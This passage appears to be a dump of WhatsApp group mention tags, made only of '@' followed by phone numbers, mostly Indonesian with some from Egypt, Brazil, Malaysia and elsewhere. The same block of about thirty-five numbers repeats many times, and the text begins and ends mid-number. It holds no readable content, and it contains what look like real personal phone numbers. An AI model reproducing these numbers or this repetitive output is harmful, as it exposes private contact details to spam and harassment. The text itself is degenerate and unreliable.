822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 